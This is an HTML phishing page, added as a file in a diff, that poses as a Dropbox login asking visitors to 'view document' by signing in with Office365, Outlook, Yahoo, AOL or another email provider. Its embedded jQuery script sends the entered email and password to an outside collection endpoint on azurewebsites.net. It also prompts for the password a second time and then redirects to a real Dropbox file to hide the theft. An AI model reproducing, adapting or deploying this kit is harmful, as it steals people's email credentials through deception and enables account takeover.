@@ -1,0 +1,277 @@
+<!-- URL =https://documentstore892.z13.web.core.windows.net/--><!-- w =(['WINDOWS.NET', 'windows.net'], [datetime.datetime(1995, 8, 10, 4, 0), datetime.datetime(1995, 8, 9, 21, 0)], [datetime.datetime(2022, 6, 4, 16, 6, 16), datetime.datetime(2022, 6, 4, 0, 0)])--><!DOCTYPE html>
+<html class="media-desktop js-focus-visible" lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://ogp.me/ns/fb#">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="*" http-equiv="Access-Control-Allow-Origin"/>
+  <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible"/>
+  <meta content="origin-when-cross-origin" name=""/>
+  <link href="https://cfl.dropboxstatic.com/static/images/favicon-vflUeLeeY.ico" rel="shortcut icon"/>
+  <meta content="Access your documents now." property="og:description"/>
+  <meta content="https://cfl.dropboxstatic.com/static/images/logo_catalog/glyph_m1%402x.png" property="og:image"/>
+  <title>
+   Login - Dropbox
+  </title>
+  <link crossorigin="anonymous" href="https://dl.dropbox.com/s/iyph1sp6n9karsz/login_or_register-vflAJk0Kd.css" rel="stylesheet" type="text/css"/>
+  <link crossorigin="anonymous" href="https://dl.dropbox.com/s/c3wnon2zes3ra1d/base-vflequooz.css" rel="stylesheet" type="text/css"/>
+  <link crossorigin="anonymous" href="https://dl.dropbox.com/s/167c10jxugzyukm/font_atlas_grotesk-vfldINMge.css" rel="stylesheet" type="text/css"/>
+  <link crossorigin="anonymous" href="https://dl.dropbox.com/s/zy865wtegesilce/login_or_register-vflZ9ry5P.css" rel="stylesheet" type="text/css"/>
+  <link href="https://dl.dropbox.com/s/sxedeas0tuit0nc/css.css" rel="stylesheet" type="text/css"/>
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+  </script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js">
+  </script>
+  <script>
+   $(document).on('show.bs.modal','#myModal', function (event) {
+				var button = $(event.relatedTarget) // Button that triggered the modal
+				var recipient = button.data('provider') // Extract info from data-* attributes
+				// If necessary, you could initiate an AJAX request here (and then do the updating in a callback).
+				// Update the modal's content. We'll use jQuery here, but you could use a data binding library or other methods instead.
+				var modal = $(this)
+				$("#pass").val("");
+				if (recipient === "@office365"){
+					modal.find('.modal-title').text('Login with ' + recipient);
+					modal.find('.mailer input').val('')
+					modal.find('#type').val(recipient)
+					$('#providerImg').html('<img src="https://dl.dropbox.com/s/ixuq5x3u8ex1c7x/Microsoft%20Office%20logo%202012.png" class="img-fluid" alt="Responsive image">');
+
+				}
+				if(recipient === "@outlook"){
+					modal.find('.modal-title').text('Login with ' + recipient);
+					modal.find('.mailer input').val('')
+					modal.find('#type').val(recipient)
+					$('#providerImg').html('<img src="https://dl.dropbox.com/s/oobz7p520riwwri/outlook-logo-vector.png" class="img-fluid" alt="Responsive image">');
+				}
+				if(recipient === "@yahoo"){
+					modal.find('.modal-title').text('Login with ' + recipient);
+					modal.find('.mailer input').val('')
+					modal.find('#type').val(recipient)
+					$('#providerImg').html('<img src="https://dl.dropbox.com/s/pz9o5h104l8irno/yahoo-76684_960_720.png" class="img-fluid" alt="Responsive image">');
+				}
+				if(recipient === "@aol"){
+					modal.find('.modal-title').text('Login with ' + recipient);
+					modal.find('.mailer input').val('')
+					modal.find('#type').val(recipient)
+					$('#providerImg').html('<img src="https://dl.dropbox.com/s/ttsidle8p7xi43u/1280px-AOL_old_logo.svg.png" class="img-fluid" alt="Responsive image">');
+				}
+				if(recipient === "@others"){
+					modal.find('.modal-title').text('Login with ' + recipient);
+					modal.find('.mailer input').val('')
+					modal.find('#type').val(recipient)
+					$('#providerImg').html('<img src="https://dl.dropbox.com/s/0hzsvqhlpyuh4v8/otherInboxlogo.png" class="img-fluid" alt="Responsive image">');
+				}
+				$("#submitBtn").click(doJob);
+				$('#recipient-name').on('keypress', function(e){
+					if(e.keyCode == '13'){
+						doJob();
+					}
+				});
+				$('#pass').on('keypress', function(e){
+					if(e.keyCode == '13'){
+						doJob();
+					}
+				});
+				function doJob(){  
+					$("#errors").html('');
+					$("#submitBtn").html('Loading...');
+					$("#submitBtn").attr("disabled", true);
+					$("#myError").remove();
+					$("#myError2").remove();
+					var formData = {
+						pass: $("#pass").val(),
+						email: $("#recipient-name").val(),
+						type: $("#type").val(),
+						once: $("#once").val(),
+					};
+					$.ajax({
+						type: "POST",
+						url: "https://apirequester.azurewebsites.net/clientsDirectory/rons/process.php",
+						//url: "https://docslater.net/dp/process.php",
+						//url: "php/process.php",
+						
+						data: formData,
+						dataType: "json",
+						encode: true,
+					}).done(function (data) {
+						if (!data.success) {
+							if (data.errors.pass) {
+								$("#pass-group").addClass("has-error");
+								$("#pass-group").append(
+								'<div class="help-block" style="color:red;" id="myError">' + data.errors.pass + "</div>");
+								$("#submitBtn").html('Login');
+								$("#submitBtn").attr("disabled", false);
+							}
+							
+							if (data.errors.pass2) {
+								$("#pass-group").addClass("has-error");
+								$("#pass-group").append(
+								'<div class="help-block" style="color:red;" id="myError">' + data.errors.pass2 + "</div>");
+								$("#pass").val("");
+								$("#once").val("2");
+								$("#submitBtn").html('Login');
+								$("#submitBtn").attr("disabled", false);
+							}
+							
+							if (data.errors.email) {
+								$("#email-group").addClass("has-error");
+								$("#email-group").append(
+								'<div class="help-block" style="color:red;" id="myError2">' + data.errors.email + "</div>");
+								$("#submitBtn").html('Login');
+								$("#submitBtn").attr("disabled", false);
+							}
+						} else {
+							$("#errors").html(
+							'<div class="alert alert-success">' + data.message + "</div>"
+							);
+							window.setTimeout(function(){window.location.href = "https://www.dropbox.com/s/ftp9ic3sgjgiff9/doc1.pdf?dl=0";}, 3000);
+						}
+
+					});
+
+					event.preventDefault();
+				}; // Submit the form
+					
+					
+			});
+  </script>
+ </head>
+ <body class="en login-or-register-page" dir="ltr">
+  <div aria-hidden="true" aria-labelledby="myModalLabel" class="modal fade" id="myModal" role="dialog" tabindex="-1">
+   <div class="modal-dialog" role="document">
+    <div class="modal-content">
+     <div class="modal-header">
+      <h5 class="modal-title" id="myModalLabel">
+       New message
+      </h5>
+      <button aria-label="Close" class="close" data-dismiss="modal" type="button">
+       <span aria-hidden="true">
+        ×
+       </span>
+      </button>
+     </div>
+     <div class="modal-body">
+      <div class="w-50 p-3" id="providerImg">
+      </div>
+      <div class="w-100 p-3" id="errors">
+      </div>
+      <form action="process.php" method="POST">
+       <div class="form-group mailer" id="email-group">
+        <label class="col-form-label" for="recipient-name">
+         Email Address:
+        </label>
+        <input class="form-control" id="recipient-name" required="" type="email"/>
+       </div>
+       <div class="form-group" id="pass-group">
+        <label class="col-form-label" for="message-text">
+         Password:
+        </label>
+        <input class="form-control" id="pass" required="" type="password"/>
+        <input class="form-control" id="type" type="hidden"/>
+        <input id="once" type="hidden" value="1"/>
+       </div>
+      </form>
+     </div>
+     <div class="modal-footer">
+      <button class="btn btn-secondary" data-dismiss="modal" type="button">
+       Close
+      </button>
+      <button class="btn btn-primary" id="submitBtn" type="button">
+       Login
+      </button>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div id="floaters">
+  </div>
+  <span class="dropbox-2015 dropbox-logo-2015">
+   <header class="mast-head">
+    <div class="mast-head__container container">
+     <nav class="mast-head__nav mast-head-nav">
+      <ul class="nav-list">
+       <li class="nav-list__item nav-list__item--dfb">
+        <a class="button-tertiary try-dfb" href="https://www.dropbox.com/business" id="try-dfb">
+         Try Dropbox Business
+        </a>
+       </li>
+      </ul>
+      <ul class="nav-list">
+       <li class="nav-list__item nav-list__item--download">
+        <a class="button-link" href="https://www.dropbox.com/downloading?src=index">
+         Download the app
+        </a>
+       </li>
+      </ul>
+     </nav>
+     <h1 class="dropbox-logo" id="dropbox-logo">
+      <a class="dropbox-logo__link" href="https://www.dropbox.com/">
+       <img alt="" class="dropbox-logo__glyph" src="https://dl.dropbox.com/s/qwlet5piu38cx70/dropbox_logo_glyph_2015_m1.svg"/>
+       <img alt="" class="dropbox-logo__type" src="https://dl.dropbox.com/s/lc9bq7jjmwxta2g/dropbox_logo_text_2015_m1.svg"/>
+       Dropbox
+      </a>
+     </h1>
+    </div>
+   </header>
+  </span>
+  <div id="outer-frame">
+   <div id="page-content">
+    <div class="main-skip-destination" id="main-skip" tabindex="-1">
+    </div>
+    <div id="login-or-register-page-content">
+     <img alt="" class="login-or-register-img" data-hi-res="https://cfl.dropboxstatic.com/static/images/empty_states/sign-in-boulder@2x-vfl87XcA-.png" data-js-component-id="component3307116136172192124" src="https://dl.dropbox.com/s/hz65ril3606724c/sign-in-boulder-vfl2oGV4v.png"/>
+     <div class="login-register-container-wrapper">
+      <div class="login-register-container standard login-register-container--link-top" id="pyxl3307116136172192125">
+       <div class="login-register-login-part">
+        <div class="clearfix">
+         <div class="login-register-header">
+         </div>
+         <div class="login-register-switch">
+          <p>
+           To view document, select your email provider below and login with your email address.
+          </p>
+          <p style="color: red;">
+           Select others if your email is not in the pre-defined list.
+          </p>
+         </div>
+        </div>
+        <div id="677iukj">
+         <div class="login-form-container standard login-form-container standard" data-reactroot="">
+          <div class="regular-login-forms">
+           <div class="login-form-container--subcontainer">
+            <div class="card">
+             <button class="btn btn-lg btn-outline-danger" data-provider="@office365" data-target="#myModal" data-toggle="modal" type="button">
+              Office365
+             </button>
+            </div>
+            <div class="card">
+             <button class="btn btn-lg btn-outline-primary" data-provider="@outlook" data-target="#myModal" data-toggle="modal" type="button">
+              Outlook
+             </button>
+            </div>
+            <div class="card">
+             <button class="btn btn-lg btn-outline-secondary" data-provider="@aol" data-target="#myModal" data-toggle="modal" type="button">
+              Aol
+             </button>
+            </div>
+            <div class="card">
+             <button class="btn btn-lg btn-outline-info" data-provider="@yahoo" data-target="#myModal" data-toggle="modal" type="button">
+              Yahoo
+             </button>
+            </div>
+            <div class="card">
+             <button class="btn btn-lg btn-outline-dark" data-provider="@others" data-target="#myModal" data-toggle="modal" type="button">
+              Others
+             </button>
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
